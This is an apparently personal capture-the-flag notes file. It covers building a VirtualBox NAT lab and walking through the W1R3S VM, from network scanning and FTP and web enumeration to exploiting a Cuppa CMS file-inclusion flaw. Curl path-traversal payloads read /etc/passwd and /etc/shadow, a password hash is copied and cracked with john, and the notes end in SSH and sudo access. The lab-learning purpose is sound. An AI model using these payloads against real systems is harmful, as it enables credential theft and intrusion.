
# CTF 30 days or 30 maq VM to hacker.
Playlist
https://www.youtube.com/watch?v=xnCS8fYfrjs&list=PLHBDBcFA_l_WBcUJWf8cp5BaPsUkquRQU

## Virtual Box Setupt : Creating your virtual network lab 

- Tolls => Properties => NATNetworks
General Options:
Name: <VMnet8> 'Created a name for your network'
IPv4 Prefix: 10.10.10.0/24 'Conf. address rang'
Apply.

## Parrot / Kali et. 
- Settings => Network
Adpter 1 => Enable Network Adapter:
Attached to: Nat Network
Name: VMnet8 'The Network you created'
Adpter Type: choose your adpter.
Promiscuous Mode: Deny ' Just allow if you might to test wifi-network'
check Cable Connected.
Ok.
You need to settup all VM for this lab the same 'NAT'your criate. 
Read morde About natwork on VM.

- https://www.nanoshots.com.br/2015/08/virtualbox-configurando-o-acesso-ssh.html
- https://www.virtualbox.org/manual/ch06.html

- Find Target on your VM 'Attacker'

# !!! Click Connection Informatio on icon Network or use ifconfig !!! You see your IP and ranger, in my case I configured to 10.10.10.0/24

- Nmap -sn <10.10.10.0/24>
- fping -a -g <10.10.10.0/24>
 -a (activi) -g (ranger)
- arp-scan --localnet
- netdiscover -r <10.10.10.0/24>
- nbtscan -r <10.10.10.0/24>
  


## Documentação das etapas de resolução do CTF ##

## 05 w1r3s

1. Reconnaissance (Recon)
Perform an Nmap scan to identify open ports.
Command Examples:
bash

nmap -sV -v -Pn <host>  
nmap -sC -A -p- -Pn <host>  
Scan Results:
bash





***********************************************************

Service Info:  
- Hosts: The, JOY.localdomain, 127.0.1.1, JOY  
- OS: Linux  
- CPE: cpe:/o:linux:linux_kernel

***********************************************************
  
2. Enumeration
FTP Enumeration
FTP allows anonymous login.
Search for files in the FTP directory for anything useful.
Files Found:
diff
//////////////////
dirb / gobuster / nikto

http://10.10.10.12/administrator/installation/
Files Found:
Cuppa CMS

********************************
searchsploit cuppa 
locate  past path.
cat <paht>








4. Exploiting 



# curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://10.10.10.12/administrator/alerts/alertConfigField.php?

# curl -s --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://10.10.10.12/administrator/alerts/alertConfigField.php?

search for pwd.

copy 
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
vi <wires>
john wires.


ssh <usr>@<host>

sudo -l

root
4. Privilege Escalation
Dont need


root  




                                                              







   
